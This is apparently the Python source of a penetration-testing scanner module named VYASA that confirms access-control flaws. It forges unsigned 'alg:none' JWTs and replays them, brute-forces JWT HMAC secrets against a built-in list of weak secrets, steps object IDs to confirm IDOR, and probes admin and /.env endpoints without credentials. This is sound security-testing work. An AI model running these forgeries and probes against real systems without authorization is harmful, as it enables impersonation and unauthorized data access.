"""
Authenticated / Access-Control confirmation for VYASA.

Confirmation-gated detectors for the access-control bugs that matter most in a
real VAPT, all proven (never guessed):

  * JWT 'alg:none' acceptance  - forge an unsigned token with the same claims and
    replay it against a protected endpoint; CONFIRMED only if the server accepts
    the forged token (returns the authenticated resource).
  * JWT weak HMAC secret       - OFFLINE: recompute HS256/384/512 over the token
    with a list of common weak secrets; CONFIRMED when one reproduces the real
    signature (no network, no false positives).
  * IDOR / BOLA                - with an authenticated session, request a
    neighbouring object id; CONFIRMED only when the neighbour returns a DIFFERENT
    valid object (its own id reflected) rather than 401/403/404 or an identical
    page.
  * Unauthenticated privileged access - probe admin/management endpoints with no
    session; CONFIRMED only on 200 + privileged content (not a login page).

Pure-stdlib JWT handling (hmac/hashlib/base64) so there is no extra dependency.
Intended for AUTHORIZED engagements only.
"""

from __future__ import annotations

import re
import json
import time
import hmac
import base64
import hashlib
import requests
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urlunparse


# ---------------------------------------------------------------------------
# Result container (shares the CONFIRMED VIA evidence convention)
# ---------------------------------------------------------------------------

@dataclass
class AccessProof:
    confirmed: bool
    vuln_class: str                 # "JWT" | "IDOR" | "AuthZ"
    technique: str
    evidence: str = ""
    request_summary: str = ""
    response_summary: str = ""
    severity: str = "HIGH"
    extras: Dict[str, str] = field(default_factory=dict)


# ---------------------------------------------------------------------------
# JWT helpers (base64url, decode, sign)
# ---------------------------------------------------------------------------

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")

# Common weak signing secrets seen in the wild / tutorials / defaults.
COMMON_JWT_SECRETS = [
    "secret", "password", "123456", "jwt", "admin", "key", "changeme", "test",
    "qwerty", "s3cr3t", "supersecret", "token", "mysecret", "default", "root",
    "jwtsecret", "secretkey", "your-256-bit-secret", "your_jwt_secret",
    "your-secret-key", "jwt_secret", "jwtkey", "privatekey", "signature",
    "hunter2", "letmein", "p@ssw0rd", "123456789", "secret123", "access",
    "HS256", "null", "none", "example", "demo", "dev", "prod", "api",
]


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt(token: str) -> Optional[Tuple[dict, dict, str, str]]:
    """Return (header, payload, signing_input, signature_b64) or None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None
    signing_input = parts[0] + "." + parts[1]
    return header, payload, signing_input, parts[2]


def find_jwt(*texts: str) -> Optional[str]:
    """Extract the first JWT-looking token from any of the given strings."""
    for t in texts:
        if not t:
            continue
        m = JWT_RE.search(t)
        if m:
            return m.group(0)
    return None


def forge_alg_none(token: str) -> Optional[str]:
    """Build an unsigned ('alg':'none') token carrying the same claims."""
    dec = decode_jwt(token)
    if not dec:
        return None
    _, payload, _, _ = dec
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


# ---------------------------------------------------------------------------
# JWT weak-secret crack (OFFLINE - no network, no false positives)
# ---------------------------------------------------------------------------

_ALG_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def confirm_weak_jwt_secret(token: str, extra_secrets: Optional[List[str]] = None) -> Optional[AccessProof]:
    dec = decode_jwt(token)
    if not dec:
        return None
    header, payload, signing_input, sig_b64 = dec
    alg = (header.get("alg") or "").upper()
    hashfn = _ALG_HASH.get(alg)
    if not hashfn:
        return None  # only HMAC algs are offline-crackable
    try:
        want = _b64url_decode(sig_b64)
    except Exception:
        return None
    for secret in (extra_secrets or []) + COMMON_JWT_SECRETS:
        got = hmac.new(secret.encode(), signing_input.encode(), hashfn).digest()
        if hmac.compare_digest(got, want):
            return AccessProof(
                confirmed=True, vuln_class="JWT", technique="weak-hmac-secret",
                severity="HIGH",
                evidence=(f"CONFIRMED VIA JWT weak secret: the token's {alg} signature was reproduced "
                          f"offline using the secret '{secret}'. Anyone who guesses this secret can forge "
                          f"valid tokens for any user/role."),
                request_summary="offline signature recomputation",
                response_summary=f"{alg} signature matched secret '{secret}'",
                extras={"secret": secret, "alg": alg},
            )
    return None


def analyze_jwt_static(token: str) -> List[AccessProof]:
    """Non-exploit structural observations (reported as suspected, not confirmed)."""
    out: List[AccessProof] = []
    dec = decode_jwt(token)
    if not dec:
        return out
    header, payload, _, _ = dec
    alg = (header.get("alg") or "").lower()
    if alg == "none":
        out.append(AccessProof(
            confirmed=True, vuln_class="JWT", technique="alg-none-in-token",
            severity="CRITICAL",
            evidence="CONFIRMED VIA JWT header: the presented token already uses \"alg\":\"none\" (unsigned) - "
                     "the server is issuing/accepting unsigned tokens.",
            response_summary="header alg=none"))
    if "exp" not in payload:
        out.append(AccessProof(
            confirmed=False, vuln_class="JWT", technique="no-expiry", severity="MEDIUM",
            evidence="SUSPECTED: JWT has no 'exp' claim - tokens never expire, so a leaked token is valid forever.",
            response_summary="no exp claim"))
    return out


# ---------------------------------------------------------------------------
# JWT alg:none acceptance (network replay)
# ---------------------------------------------------------------------------

def confirm_jwt_none_accepted(session, protected_url: str, real_token: str,
                              header_name: str = "Authorization",
                              bearer: bool = True, timeout: float = 6.0) -> Optional[AccessProof]:
    """Replay a forged alg:none token. CONFIRMED only if the protected resource
    behaves as authenticated with the forged token AND as unauthenticated
    without it (so we know the endpoint actually enforces auth)."""
    forged = forge_alg_none(real_token)
    if not forged:
        return None

    # Use an ISOLATED session so the only credential is the token we choose - the
    # caller's session carries a global auth header/cookie, which would make the
    # "no token" probe look authenticated and hide the bug.
    clean = requests.Session()
    clean.verify = False
    clean.headers["User-Agent"] = session.headers.get("User-Agent", "VYASA") if session is not None else "VYASA"

    def _get(tok: Optional[str]):
        h = {}
        if tok is not None:
            h[header_name] = f"Bearer {tok}" if bearer else tok
        try:
            return clean.get(protected_url, headers=h, timeout=timeout, verify=False, allow_redirects=False)
        except Exception:
            return None

    authed = _get(real_token)
    noauth = _get(None)
    forgedr = _get(forged)
    # NOTE: a requests.Response is "falsy" when status >= 400 (bool(resp) == resp.ok),
    # so a 401 would wrongly look empty - check identity, not truthiness.
    if authed is None or noauth is None or forgedr is None:
        return None

    def _ok(r):  # looks "authenticated"
        return r.status_code == 200
    def _denied(r):
        return r.status_code in (401, 403) or r.status_code in (301, 302, 307, 308)

    # Endpoint must actually enforce auth (real token works, no token denied),
    # and the forged none-token must be accepted like the real one.
    if _ok(authed) and _denied(noauth) and _ok(forgedr) and \
       abs(len(forgedr.text or "") - len(authed.text or "")) <= max(40, int(0.1 * (len(authed.text or "") + 1))):
        return AccessProof(
            confirmed=True, vuln_class="JWT", technique="alg-none-accepted", severity="CRITICAL",
            evidence=(f"CONFIRMED VIA JWT alg:none: a forged UNSIGNED token (alg:none, same claims) was "
                      f"accepted at {protected_url} (HTTP {forgedr.status_code}, ~authenticated body), while "
                      f"no token was denied (HTTP {noauth.status_code}). An attacker can forge any identity."),
            request_summary=f"GET {protected_url} with forged alg:none token",
            response_summary=f"forged={forgedr.status_code}, real={authed.status_code}, none={noauth.status_code}",
        )
    return None


# ---------------------------------------------------------------------------
# IDOR / BOLA (authenticated differential on a neighbouring object id)
# ---------------------------------------------------------------------------

_ID_IN_PATH = re.compile(r"/(\d{1,12})(?=/|$)")
_ID_IN_QUERY = re.compile(r"([?&](?:id|user_id|uid|account|order|invoice|doc|pid|num)=)(\d{1,12})", re.I)


def _neighbour_urls(url: str) -> List[Tuple[str, str, str]]:
    """Yield (neighbour_url, original_id, neighbour_id) by stepping a numeric id
    in the path or query down by one (and up by one)."""
    out = []
    mq = _ID_IN_QUERY.search(url)
    if mq:
        orig = mq.group(2)
        for delta in (-1, 1):
            nid = str(int(orig) + delta)
            if int(nid) >= 0:
                out.append((url[:mq.start(2)] + nid + url[mq.end(2):], orig, nid))
    mp = _ID_IN_PATH.search(urlparse(url).path)
    if mp:
        orig = mp.group(1)
        parsed = urlparse(url)
        for delta in (-1, 1):
            nid = str(int(orig) + delta)
            if int(nid) >= 0:
                newpath = parsed.path[:mp.start(1)] + nid + parsed.path[mp.end(1):]
                out.append((urlunparse(parsed._replace(path=newpath)), orig, nid))
    return out[:4]


def confirm_idor(session, url: str, timeout: float = 6.0) -> Optional[AccessProof]:
    """With the session's (authenticated) cookies/headers, confirm IDOR when a
    neighbouring object id returns a DIFFERENT valid object. Gated hard to avoid
    false positives on static or access-controlled pages."""
    neighbours = _neighbour_urls(url)
    if not neighbours:
        return None
    try:
        base = session.get(url, timeout=timeout, verify=False, allow_redirects=False)
    except Exception:
        return None
    if base is None or base.status_code != 200:
        return None
    base_body = base.text or ""

    for nurl, orig, nid in neighbours:
        try:
            r = session.get(nurl, timeout=timeout, verify=False, allow_redirects=False)
        except Exception:
            continue
        if r is None or r.status_code != 200:
            continue
        body = r.text or ""
        # Must be a real, DIFFERENT object: the neighbour's own id appears in its
        # body, the original id does NOT, bodies are structurally similar (same
        # page type) but not identical.
        same_structure = abs(len(body) - len(base_body)) <= max(200, int(0.5 * (len(base_body) + 1)))
        reflects_nid = re.search(rf"\b{re.escape(nid)}\b", body) is not None
        not_orig = re.search(rf"\b{re.escape(orig)}\b", body) is None
        different = body != base_body
        if same_structure and reflects_nid and not_orig and different:
            return AccessProof(
                confirmed=True, vuln_class="IDOR", technique="object-id-enumeration", severity="HIGH",
                evidence=(f"CONFIRMED VIA IDOR/BOLA: changing the object id from {orig} to {nid} returned a "
                          f"DIFFERENT valid object (HTTP 200, id {nid} reflected in the body) under the same "
                          f"session - the app does not check object ownership. PoC: {nurl}"),
                request_summary=f"GET {nurl} (id {orig}->{nid})",
                response_summary=f"HTTP 200, distinct object {nid} returned",
            )
    return None


# ---------------------------------------------------------------------------
# Unauthenticated privileged-endpoint access
# ---------------------------------------------------------------------------

PRIV_ENDPOINTS = [
    "/admin", "/admin/", "/admin/dashboard", "/administrator", "/admin/index.php",
    "/manage", "/management", "/dashboard", "/console", "/actuator", "/actuator/health",
    "/api/admin", "/api/users", "/api/v1/users", "/wp-admin/", "/user/admin",
    "/debug", "/metrics", "/server-status", "/phpmyadmin/", "/.env",
]
_LOGIN_MARKERS = ("login", "sign in", "signin", "password", "unauthor", "forbidden",
                  "please log in", "authentication required", "csrf")


def confirm_unauth_privileged(session, base_url: str, timeout: float = 6.0) -> Optional[AccessProof]:
    """Probe privileged endpoints with NO credentials; confirm only on a 200 that
    returns privileged content rather than a login/redirect."""
    clean = session  # caller passes an UNAUTHENTICATED session for this check
    for ep in PRIV_ENDPOINTS:
        url = base_url.rstrip("/") + ep
        try:
            r = clean.get(url, timeout=timeout, verify=False, allow_redirects=False)
        except Exception:
            continue
        if r is None or r.status_code != 200:
            continue
        body = (r.text or "")
        low = body.lower()
        if len(body) < 50:
            continue
        if any(m in low for m in _LOGIN_MARKERS):
            continue  # it's a login/forbidden page, not real privileged access
        # Privileged markers: admin UI or structured data.
        if any(k in low for k in ("admin", "dashboard", "users", "manage", "settings",
                                  "\"email\"", "propertysources", "metrics")):
            return AccessProof(
                confirmed=True, vuln_class="AuthZ", technique="unauth-privileged-access",
                severity="HIGH",
                evidence=(f"CONFIRMED VIA unauthenticated access: '{ep}' returned HTTP 200 with privileged "
                          f"content and no login/redirect, so it is reachable with NO authentication. "
                          f"PoC: GET {url}"),
                request_summary=f"GET {ep} (no credentials)",
                response_summary=f"HTTP 200 ({len(body)} bytes), privileged content",
                extras={"endpoint": ep})
    return None
